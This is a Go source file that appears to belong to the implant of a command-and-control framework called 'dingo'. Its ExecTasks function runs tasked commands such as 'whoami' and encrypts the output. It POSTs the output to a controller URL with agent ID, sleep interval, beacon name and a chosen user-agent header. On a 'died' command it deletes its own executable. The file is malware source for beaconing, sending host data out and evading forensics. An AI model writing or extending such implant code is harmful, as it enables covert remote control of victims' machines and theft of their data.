package check

import (
	"bytes"
	"dingo/initialization"
	"dingo/tasks"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	selfdelete "github.com/secur30nly/go-self-delete"
)

func ExecTasks(tasksToDo []string, url string, sleep *int, agentid string, useragent string, key []byte, beacon_name string) {
	for _, task := range tasksToDo {
		var data string

		taskSplit := strings.Split(task, " - ")
		task = taskSplit[0]
		// taskData := taskSplit[1]

		fmt.Println(task)

		switch task {
		case "whoami":
			data, _ = initialization.GetUsername()
		}

		rawJsonData := tasks.HttpTaskPostRequest{
			Task: task,
			Data: data,
		}

		jsonData, _ := json.Marshal(rawJsonData)
		jsonDataEncrypted, _ := initialization.EncryptString(key, string(jsonData))

		client := &http.Client{}
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonDataEncrypted)))

		req.Header.Add("AgentID", agentid)
		req.Header.Add("CallType", "Task")
		req.Header.Set("User-Agent", useragent)
		req.Header.Add("SLEEP", fmt.Sprint(*sleep))
		req.Header.Add("Name", beacon_name)

		client.Do(req)

		// kill self if die command used
		if data == "died" {
			selfdelete.SelfDeleteExe()
			os.Exit(2)
		}
	}
}
